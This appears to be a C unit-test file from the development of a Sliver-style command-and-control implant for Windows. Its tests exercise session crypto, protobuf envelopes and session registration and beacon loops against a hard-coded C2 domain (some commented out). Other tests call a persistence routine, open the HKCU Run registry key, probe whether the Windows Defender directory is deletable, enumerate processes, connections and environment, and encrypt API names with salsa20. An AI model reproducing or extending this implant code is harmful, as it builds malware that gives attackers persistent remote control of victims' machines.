	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
	HMODULE hMod = NULL;
	ED25519_VERIFY ed25519_verify = NULL;

	if (!ED25519Verify(Signature, Msg, _countof(Msg), PubKey)) {
		PrintFormatA("FALSE\n");
	}
	else {
		PrintFormatA("TRUE\n");
	}
}

void test44(void) {
	BYTE Msg[] = { 218, 1, 175, 173, 130, 127, 18, 224, 155, 253, 10, 118, 58, 148, 82, 75, 107, 121, 234, 27, 1, 162, 86, 123, 42, 86, 137, 119, 235, 218, 226, 89, 159, 36, 134, 161, 199, 18, 63, 48, 84, 251, 126, 144, 111, 105, 252, 50, 71, 3, 180, 224, 167, 23, 175, 99, 229, 48, 200, 185, 145, 130, 91, 25, 33, 98, 52, 247, 201, 120, 221, 199, 41, 247, 222, 191, 90, 65, 87, 50, 18, 145, 56, 106, 208, 228 };
	BYTE PubKey[] = { 69, 146, 99, 138, 2, 14, 15, 228, 78, 68, 167, 140, 48, 156, 176, 251, 151, 23, 140, 102, 254, 76, 161, 227, 126, 46, 203, 163, 199, 22, 37, 42 };
	BYTE Signature[] = { 112, 170, 174, 238, 194, 80, 174, 195, 105, 64, 246, 2, 239, 184, 35, 205, 42, 85, 150, 16, 225, 147, 228, 17, 249, 8, 118, 174, 211, 177, 206, 159, 245, 113, 219, 53, 45, 186, 203, 94, 182, 76, 5, 77, 176, 249, 35, 22, 67, 237, 95, 71, 186, 35, 204, 13, 153, 248, 66, 4, 39, 6, 162, 3 };
	HMODULE hMod = NULL;
	ED25519_VERIFY ed25519_verify = NULL;

	hMod = LoadLibraryA("ed25519_64.dll");
	ed25519_verify = (ED25519_VERIFY)GetProcAddress(hMod, "ed25519_verify");
	if (!ed25519_verify(Signature, Msg, _countof(Msg), PubKey)) {
		PrintFormatA("FALSE\n");
	}
	else {
		PrintFormatA("TRUE\n");
	}
}

void test45(void) {
	//BYTE pSessionKey[] = { 27, 77, 147, 18, 250, 64, 204, 175, 58, 32, 210, 175, 62, 24, 182, 214, 170, 115, 195, 221, 244, 178, 189, 132, 38, 103, 156, 124, 12, 1, 2, 19 };
	//PSLIVER_HTTP_CLIENT pClient = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
	//BYTE Msg[] = { 69, 100, 209, 158, 5, 31, 113, 166, 249, 84, 225, 239, 116, 125, 149, 140, 204, 119, 2, 31, 96, 107, 139, 28, 67, 159, 249, 103, 138, 114, 123, 126, 11, 155, 121, 78, 161, 59, 206, 84, 190, 180, 194, 199, 15, 91, 104, 221, 196, 235, 203, 151, 198, 99, 144, 167, 156, 84, 51, 111, 141, 53, 151, 249, 190, 17, 155, 127, 154, 28, 236, 178, 59, 12, 229, 21, 226, 234, 18, 14, 165, 8, 26, 86, 32, 236, 76, 24, 218, 159, 240, 218, 61, 237, 211, 254, 101, 39, 216, 59, 150, 27, 234, 36, 1, 61, 128, 112, 38, 232, 135, 122, 195, 208, 28, 127, 246, 139, 135, 71, 3, 162, 178, 253, 172, 161, 43, 77, 239, 188, 217, 1, 3, 180 };
	//CHAR szServerMinisignPubKey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";

	///*serverPublicKey: { [69 100] [53 145 169 236 40 159 114 61] [223 82 193 19 96 27 37 74 25 127 205 185 41 138 222 170 251 236 164 190 112 186 20 219 150 85 70 183 126 65 193 132] }
	//c.Key: [53 147 30 66 50 102 161 188 109 18 221 32 152 70 196 146 239 155 227 74 90 234 40 216 69 217 32 221 40 121 249 32]
	//plaintext: [51 51 48 98 55 50 102 53 56 55 54 99 50 55 52 56 99 48 52 51 51 97 54 54 52 51 53 102 53 101 48 53]*/
	//PBYTE pPlainText = NULL;
	//DWORD cbPlainText = 0;

	//pClient->pSessionKey = pSessionKey;
	//pClient->lpServerMinisignPublicKey = szServerMinisignPubKey;
	//pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), &cbPlainText);
	//HexDump(pPlainText, cbPlainText);
	//FREE(pClient);
}

void test46(void) {
	BYTE CipherText[] = { 166, 79, 199, 13, 85, 218, 251, 232, 139, 101, 168, 155, 94, 25, 228, 162, 11, 94, 32, 191, 233, 46, 57, 97, 121, 197, 154, 137, 5, 34, 76, 247, 150, 52, 58, 39, 239, 16, 60, 116, 166, 48, 14, 174, 8, 51, 158, 228, 88, 229, 61, 76, 203, 243, 127, 192, 97, 237, 232, 91, 29, 13, 168, 63, 8, 166, 180, 218, 130, 83, 246, 108, 153, 165, 8, 228, 41, 110, 24, 255, 201, 79 };
	BYTE Key[] = { 231, 121, 89, 214, 23, 251, 49, 23, 236, 76, 192, 5, 20, 135, 151, 126, 176, 103, 181, 0, 131, 195, 5, 20, 64, 243, 54, 65, 45, 46, 151, 150 };
	BYTE Nonce[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };
	PBUFFER pPlainText = NULL;

	pPlainText = Chacha20Poly1305DecryptAndVerify(Key, Nonce, CipherText, _countof(CipherText), NULL, 0);
	HexDump(pPlainText->pBuffer, pPlainText->cbBuffer);
	FreeBuffer(pPlainText);
}

void test47(void) {
	CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";

	PersistenceMethod1(szCommandLine);
}

void test48(void) {
	PHTTP_CLIENT pHttpClient = NULL;
	HTTP_CONFIG HttpConfig;
	LPSTR lpProxy = NULL;
	PURI pUri = NULL;
	LPSTR lpResp = NULL;
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
	PHTTP_RESP pResp = NULL;

	RtlSecureZeroMemory(&HttpConfig, sizeof(HttpConfig));
	HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
	pUri = UriInit("https://api.seeip.org");
	if (pUri == NULL) {
		goto CLEANUP;
	}

	HttpConfig.dwNumberOfAttemps = 10;
	pHttpClient = HttpClientInit(pUri);
	pResp = SendHttpRequest(&HttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, FALSE, TRUE);
	if (pResp == NULL) {
		goto CLEANUP;
	}

	lpResp = ALLOC(pResp->cbResp + 1);
	memcpy(lpResp, pResp->pRespData, pResp->cbResp);
	PrintFormatA("Resp Data: %s\n", lpResp);
CLEANUP:
	if (lpResp != NULL) {
		FREE(lpResp);
	}

	if (lpProxy != NULL) {
		FREE(lpProxy);
	}

	if (HttpConfig.lpUserAgent != NULL) {
		FREE(HttpConfig.lpUserAgent);
	}

	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
}

void test49(void) {
	LPWSTR lpProxyUrl = NULL;

	if (!WinHttpDetectAutoProxyConfigUrl(WINHTTP_AUTO_DETECT_TYPE_DNS_A, &lpProxyUrl)) {
		LOG_ERROR("WinHttpDetectAutoProxyConfigUrl", GetLastError());
		return;
	}

	PrintFormatW(L"lpProxyUrl: %s", lpProxyUrl);
	GlobalFree(lpProxyUrl);
}

void test50(void) {
	WINHTTP_PROXY_INFO ProxyDefault;

	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
	if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault)) {
		LOG_ERROR("WinHttpGetDefaultProxyConfiguration", GetLastError());
		return;
	}

	PrintFormatW(L"lpszProxy: %s\n", ProxyDefault.lpszProxy);
	PrintFormatW(L"lpszProxyBypass: %s", ProxyDefault.lpszProxyBypass);
}

void test51(void) {
	/*PSLIVER_HTTP_CLIENT pHttpClient = NULL;
	pHttpClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
	if (pHttpClient == NULL) {
		return;
	}

	PrintFormatA("SessionID: %s\n", pHttpClient->szSessionID);
	FreeSliverHttpClient(pHttpClient);*/
}

void test52(void) {
	/*BYTE SessionKey[] = { 0x95, 0x7d, 0x45, 0x5f, 0x5c, 0xed, 0x74, 0xdf, 0x8, 0xcf, 0x10, 0x15, 0xa1, 0xb1, 0x73, 0x8b, 0x45, 0xac, 0x74, 0x57, 0x71, 0x48, 0x36, 0x4d, 0xe8, 0x49, 0xad, 0x2f, 0x18, 0x4f, 0xce, 0x11 };
	BYTE Nonce[] = { 0x4f, 0x6a, 0xa6, 0x7e, 0x22, 0x82, 0x3a, 0x63, 0xa1, 0x78, 0xae, 0xe0 };
	BYTE CipherText[] = { 0xdd, 0xe5, 0xfc, 0x4c, 0xb2, 0x28, 0xe, 0xff, 0x2, 0x2b, 0x8f, 0x56, 0xaf, 0x35, 0x43, 0x4a, 0xde, 0x98, 0x3f, 0xd1, 0xb5, 0x84, 0x77, 0xa3, 0x9e, 0x52, 0xfc, 0x7d, 0xa2, 0x44, 0xaa, 0x92, 0x82, 0x85, 0xc2, 0xdd, 0x43, 0x83, 0x37, 0x18, 0xf0, 0xb, 0x2e, 0x6b, 0x6b, 0xdc, 0xbc, 0x53 };*/

	// -----------------------
	BYTE SessionKey[] = { 234, 74, 74, 12, 251, 78, 117, 118, 101, 175, 24, 153, 110, 240, 212, 227, 20, 58, 122, 50, 237, 29, 139, 36, 229, 101, 166, 47, 159, 185, 133, 45 };
	BYTE Nonce[] = { 189, 147, 30, 168, 197, 184, 111, 176, 175, 40, 81, 247 };
	BYTE CipherText[] = { 186, 46, 74, 199, 245, 172, 132, 246, 179, 28, 129, 194, 96, 41, 128, 21, 103, 222, 254, 242, 234, 89, 148, 174, 81, 127, 131, 87, 214, 0, 34, 133, 214, 3, 44, 119, 121, 179, 62, 156, 37, 83, 92, 90, 221, 127, 138, 174 };

	DWORD cbPlainText = 0;
	PBUFFER pPlainText = NULL;

	pPlainText = Chacha20Poly1305DecryptAndVerify(SessionKey, Nonce, CipherText, _countof(CipherText), NULL, 0);
	if (pPlainText == NULL || cbPlainText == 0) {
		PrintFormatW(L"Chacha20Poly1305DecryptAndVerify failed.\n");
		return;
	}

	HexDump(pPlainText, cbPlainText);
	FreeBuffer(pPlainText);
}

void test53(void) {
	LPSTR lpSid = NULL;

	lpSid = GetCurrentUserSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);
}

void test54(void) {
	LPSTR lpSid = NULL;

	lpSid = GetCurrentProcessUserSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);

	lpSid = GetCurrentProcessGroupSID();
	if (lpSid == NULL) {
		return;
	}

	PrintFormatA("lpSid: %s\n", lpSid);
	FREE(lpSid);
}

void test55(void) {
	/*CHAR szHostName[0x100];

	WSAStartup();
	SecureZeroMemory(szHostName, sizeof(szHostName));
	gethostname(szHostName, 0x100);
	PrintFormatA("%s\n", szHostName);*/
}

void test56(void) {
	PBYTE pOutput = NULL;
	DWORD cbOutput = 0;

	pOutput = MarshalVarInt(60000000000, &cbOutput);
	HexDump(pOutput, cbOutput);
}

void test57(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pOutput = NULL;
	DWORD cbOutput = 0;

	pSliverClient = SliverHttpClientInit("https://ubuntu-icefrog2000.com");
	pOutput = RegisterSliver(pSliverClient, &cbOutput);
	HexDump(pOutput, cbOutput);
	FREE(pOutput);
	FreeSliverHttpClient(pSliverClient);*/
}

void test58(void) {
	BYTE MarshaledData[] = { 10, 5, 1, 2, 3, 4, 5, 18, 147, 2, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 24, 188, 181, 226, 179, 197, 198, 4, 32, 1, 48, 213, 204, 221, 195, 8, 58, 11, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 58, 11, 84, 114, 97, 110, 103, 32, 78, 104, 117, 110, 103, 58, 10, 78, 103, 111, 99, 32, 72, 117, 121, 101, 110, 66, 25, 10, 10, 72, 97, 110, 103, 32, 84, 114, 97, 110, 103, 10, 11, 84, 114, 97, 110, 32, 80, 104, 117, 111, 110, 103, 74, 10, 0, 7, 8, 9, 153, 239, 213, 154, 147, 2 };
	PPBElement ElementList[9];
	DWORD i = 0;
	LPVOID* pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Bytes;
	ElementList[1]->Type = Bytes;
	ElementList[2]->Type = Varint;
	ElementList[3]->Type = Varint;
	FREE(ElementList[4]);
	ElementList[4] = NULL;
	ElementList[5]->Type = Varint;
	ElementList[6]->Type = RepeatedBytes;
	ElementList[7]->Type = StructType;
	ElementList[8]->Type = RepeatedVarint;

	ElementList[7]->SubElements = ALLOC(sizeof(PPBElement));
	ElementList[7]->SubElements[0] = ALLOC(sizeof(PBElement));
	ElementList[7]->SubElements[0]->Type = RepeatedBytes;
	ElementList[7]->SubElements[0]->dwFieldIdx = 1;
	ElementList[7]->dwNumberOfSubElement = 1;
	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
}

void test59(void) {
	BYTE MarshaledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;
	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
	PrintFormatA("pResult->uID: 0x%08llx\n", pResult->uID);
	PrintFormatA("pResult->uType: 0x%08llx\n", pResult->uType);
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
	PrintFormatA("pResult->UnknownMessageType: 0x%08llx", pResult->uUnknownMessageType);
}

void test60(void) {
	BYTE MarshaledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
	PPBElement ElementList[2];
	DWORD i = 0;
	PBYTE pResult = NULL;

	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
	}

	ElementList[0]->dwFieldIdx = 1;
	ElementList[0]->Type = Bytes;
	ElementList[1]->dwFieldIdx = 9;
	ElementList[1]->Type = StructType;
	ElementList[1]->dwNumberOfSubElement = 4;
	ElementList[1]->SubElements = ALLOC(sizeof(PPBElement) * ElementList[1]->dwNumberOfSubElement);
	for (i = 0; i < ElementList[1]->dwNumberOfSubElement; i++) {
		ElementList[1]->SubElements[i] = ALLOC(sizeof(PBElement));
		ElementList[1]->SubElements[i]->dwFieldIdx = i + 1;
	}

	ElementList[1]->SubElements[2]->dwFieldIdx = 8;
	ElementList[1]->SubElements[3]->dwFieldIdx = 9;

	ElementList[1]->SubElements[0]->Type = Varint;
	ElementList[1]->SubElements[1]->Type = Varint;
	ElementList[1]->SubElements[2]->Type = Bytes;
	ElementList[1]->SubElements[3]->Type = Bytes;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
}

void test61(void) {
	PrintFormatA("%d\n", RtlGetCurrentProcessorNumber());
}

void test62(void) {
	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
	PBYTE pMarshaledRegisterInfo = NULL;
	DWORD cbMarshaledRegisterInfo = 0;
	PENVELOPE pRegisterEnvelope = NULL;

	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
	if (pSliverClient == NULL) {
		LogError(L"%s.%d: SliverHttpClientInit failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
	if (pMarshaledRegisterInfo == NULL) {
		LogError(L"%s.%d: RegisterSliver failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
		goto CLEANUP;
	}

	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
	pRegisterEnvelope->uType = MsgRegister;
	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
	WriteEnvelope(pSliverClient, pRegisterEnvelope);
	SessionMainLoop(pSliverClient);
CLEANUP:
	FreeEnvelope(pRegisterEnvelope);
	FreeSliverHttpClient(pSliverClient);
	return;*/
}

void test63
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PVOID Context,
	_Inout_ PTP_WORK Work
)
{
	PrintFormatW(L"Main handler\n");
}

void test64(void) {
	PSLIVER_THREADPOOL pSliverPool = InitializeSliverThreadPool();
	PTP_WORK pWork = NULL;
	DWORD i = 0;

	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
		pWork = CreateThreadpoolWork(test63, NULL, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			goto CLEANUP;
		}

		TpPostWork(pWork);
		i++;
		if (i == 5) {
			break;
		}

		Sleep(2000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);
	return;
}

void test65(void) {
	CHAR szBuffer[] = "C:\\Users";
	LPSTR lpRespData = NULL;

	if (!SetCurrentDirectoryA(szBuffer)) {
		lpRespData = ALLOC(0x100);
		wsprintfA(lpRespData, "SetCurrentDirectoryA failed at %s (Error: 0x%08x)", __FUNCTION__, GetLastError());
	}
	else {
		lpRespData = ALLOC(MAX_PATH);
		GetCurrentDirectoryA(MAX_PATH, lpRespData);
	}

	PrintFormatA("lpRespData: %s\n", lpRespData);
	return;
}

void test66(void) {
	LPWSTR lpBuffer = NULL;

	lpBuffer = GetEnvironmentStringsW();
	FreeEnvironmentStringsW(lpBuffer);
}

void test67(void) {
	ENVELOPE Envelope;
	BYTE Buffer[] = { 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 99, 49, 51, 51, 98, 101, 53, 100, 45, 49, 48, 50, 100, 45, 52, 99, 56, 57, 45, 57, 51, 49, 100, 45, 51, 49, 53, 48, 97, 97, 53, 56, 53, 52, 55, 53 };
	PENVELOPE pResult = NULL;

	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = Buffer;
	Envelope.pData->cbBuffer = sizeof(Buffer);
	pResult = GetEnvHandler(&Envelope);
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
	FreeEnvelope(pResult);
}

void test68(void) {
	RaiseException(EXCEPTION_BREAKPOINT, EXCEPTION_NONCONTINUABLE, 0, NULL);
}

void test69(void) {
	LPSTR lpBuffer = ALLOC(MAX_PATH);
	DWORD dwReturnedLength = 0;

	dwReturnedLength = GetCurrentDirectoryA(10, lpBuffer);
	HexDump(lpBuffer, MAX_PATH);
	PrintFormatW(L"dwReturnedLength: %d\n", dwReturnedLength);
	FREE(lpBuffer);
}

void test70(void) {
	DeletePath(L"C:\\Users\\Admin\\Desktop\\Test");
}

void test71(void) {
	MovePath(L"C:\\Users\\Admin\\Desktop\\Test", L"C:\\Users\\Admin\\Desktop\\Test2\\Test3");
}

void test72(void) {
	WCHAR wszPath[] = L"C:\\Program Files\\Windows Defender";

	BOOL Result = CanPathBeDeleted(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
	Result = IsPathWritable(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
	Result = IsPathReadable(wszPath);
	PrintFormatW(L"Result: %d\n", Result);
}

void test73(void) {
	LPSTR lpOutput = NULL;

	lpOutput = FormatErrorCode(5);
	PrintFormatA("Error: %s\n", lpOutput);
	FREE(lpOutput);
}

void test74(void) {
	IfconfigHandler(NULL);
}

void test75(void) {
	HANDLE hProcess = NULL;
	LPSTR lpOutput = NULL;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 13220);
	if (hProcess == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		return;
	}

	lpOutput = DescribeProcessMitigation(hProcess);
	PrintFormatA("%s\n", lpOutput);
	CloseHandle(hProcess);
}

void test76(void) {
	DWORD cbVersionInfo = 0;
	WCHAR wszPath[] = L"C:\\Users\\Admin\\AppData\\Local\\Programs\\Zalo\\Zalo-24.8.5\\Zalo.exe";
	DWORD dwHandle = 0;
	PBYTE pVersionInfo = NULL;
	VS_FIXEDFILEINFO* FixedFileInfo = NULL;
	DWORD i = 0;
	LPSTR lpVersion = NULL;
	ULONG uLangCodePage = 0;
	LPSTR lpCompanyName = NULL;
	LPSTR lpFileDesc = NULL;
	LPSTR lpProductName = NULL;

	cbVersionInfo = GetFileVersionInfoSizeW(wszPath, &dwHandle);
	pVersionInfo = ALLOC(cbVersionInfo);
	if (!GetFileVersionInfoW(wszPath, 0, cbVersionInfo, pVersionInfo)) {
		LOG_ERROR("GetFileVersionInfoW", GetLastError());
		goto CLEANUP;
	}

	for (i = 0; i < cbVersionInfo; i += sizeof(DWORD)) {
		if (*(PDWORD)(pVersionInfo + i) == VS_FFI_SIGNATURE) {
			FixedFileInfo = (VS_FIXEDFILEINFO*)(pVersionInfo + i);
		}
	}

	if (FixedFileInfo == NULL) {
		goto CLEANUP;
	}

	lpVersion = ALLOC(0x20);
	wsprintfA(lpVersion, "%d.%d.%d.%d", HIWORD(FixedFileInfo->dwFileVersionMS), LOWORD(FixedFileInfo->dwFileVersionMS), HIWORD(FixedFileInfo->dwFileVersionLS), LOWORD(FixedFileInfo->dwFileVersionLS));
	uLangCodePage = GetFileVersionInfoLangCodePage(pVersionInfo);
	lpCompanyName = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"CompanyName");
	lpFileDesc = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"FileDescription");
	lpProductName = GetFileVersionInfoStringEx(pVersionInfo, uLangCodePage, L"ProductName");

	PrintFormatA("lpVersion: %s\n", lpVersion);
	PrintFormatA("lpCompanyName: %s\n", lpCompanyName);
	PrintFormatA("lpFileDesc: %s\n", lpFileDesc);
	PrintFormatA("lpProductName: %s\n", lpProductName);
CLEANUP:
	if (pVersionInfo != NULL) {
		FREE(pVersionInfo);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	return;
}

void test77(void) {
	HANDLE hProc = NULL;
	LPSTR lpCommandLine = NULL;

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 13276);
	if (hProc == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		return;
	}

	lpCommandLine = GetProcessCommandLine(hProc);
	PrintFormatA("%s", lpCommandLine);
	CloseHandle(hProc);
	FREE(lpCommandLine);
}

void test78(void) {
	SHCreateDirectory(NULL, L"C:\\Users\\Admin\\Desktop\\Test1\\Test2");
}

void test79(void) {
	PNETWORK_CONNECTION pConnections = NULL;
	PNETWORK_CONNECTION pConnectionEnrty = NULL;
	DWORD dwNumberOfConnections = 0;
	DWORD i = 0;
	DWORD j = 0;
	CHAR szIPv4[17];
	ULONG uIpv4 = 0;

	pConnections = GetNetworkConnections(&dwNumberOfConnections);
	for (i = 0; i < dwNumberOfConnections; i++) {
		pConnectionEnrty = &pConnections[i];
		PrintFormatA("uProtocolType: %d\n", pConnectionEnrty->uProtocolType);
		PrintFormatA("Ipv4: ");
		uIpv4 = pConnectionEnrty->LocalEndpoint.Address.Ipv4;
		SecureZeroMemory(szIPv4, sizeof(szIPv4));
		for (j = 0; j < sizeof(ULONG); j++) {
			wsprintfA(&szIPv4[lstrlenA(szIPv4)], "%d.", ((uIpv4 >> (j * 4)) & 0xFF));
		}

		szIPv4[lstrlenA(szIPv4) - 1] = '\0';
		PrintFormatA("%s", szIPv4);
	}
}

void test80(void) {
	PENVELOPE pEnvelope = NULL;
	PENVELOPE pRespEnvelope = NULL;

	pEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope = PsHandler(pEnvelope);
	HexDump(pRespEnvelope->pData->pBuffer, pRespEnvelope->pData->cbBuffer);
	FreeEnvelope(pRespEnvelope);
}

void test81(void) {
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;

	Status = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	PrintFormatA("0x%08x\n", Status);
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
}

void test82(void) {
	BYTE Data[] = { 10, 19, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 52, 53, 53, 97, 56, 49, 102, 45, 101, 102, 102, 101, 45, 52, 56, 100, 97, 45, 57, 102, 99, 99, 45, 99, 51, 51, 102, 56, 97, 54, 52, 56, 100, 101, 97 };
	PENVELOPE pRespEnvelope = NULL;
	PENVELOPE pEnvelope = ALLOC(sizeof(ENVELOPE));
	pEnvelope->pData = ALLOC(sizeof(BUFFER));
	pEnvelope->pData->pBuffer = Data;
	pEnvelope->pData->cbBuffer = sizeof(Data);
	pRespEnvelope = IcaclsHandler(pEnvelope);
	FreeEnvelope(pRespEnvelope);
}
void test83(void) {
	LPSTR lpOwner = GetFileOwner(L"C:\\Users\\Admin\\Desktop");
	PrintFormatA("%s\n", lpOwner);
	FREE(lpOwner);
}

void test84(void) {
	WCHAR wszBuffer[] = L"Advapi32.dll\0";
	BYTE Key[] = { 0x5c, 0xf6, 0xee, 0x79, 0x2c, 0xdf, 0x5, 0xe1, 0xba, 0x2b, 0x63, 0x25, 0xc4, 0x1a, 0x5f, 0x10 };
	BYTE Nonce[] = { 0x31, 0x7a, 0xae, 0x7, 0x69, 0xad, 0xab, 0x88 };
	BYTE CipherText[] = { 89, 147, 123, 111, 191, 132, 39, 51, 116, 107, 229, 182, 166, 46, 35, 216, 155, 53, 135, 241, 203, 185, 201, 29, 108, 91, 127, 88 };
	salsa20_encrypt(Key, Nonce, wszBuffer, sizeof(wszBuffer));
	HexDump(wszBuffer, sizeof(wszBuffer));
	salsa20_encrypt(Key, Nonce, wszBuffer, sizeof(wszBuffer));
	HexDump(wszBuffer, sizeof(wszBuffer));
}

void test85(void) {
	LPWSTR lpPath = NULL;

	lpPath = GetTargetShortcutFile(L"C:\\Users\\Admin\\Desktop\\Apps\\AULA F75.lnk");
	PrintFormatW(L"lpPath: %s\n", lpPath);
	FREE(lpPath);
}

void test86(void) {
	LPWSTR lpPath = NULL;

	lpPath = GetSymbolLinkTargetPath(L"C:\\Users\\Admin\\Downloads\\Apps");
	PrintFormatW(L"lpPath: %s\n", lpPath);
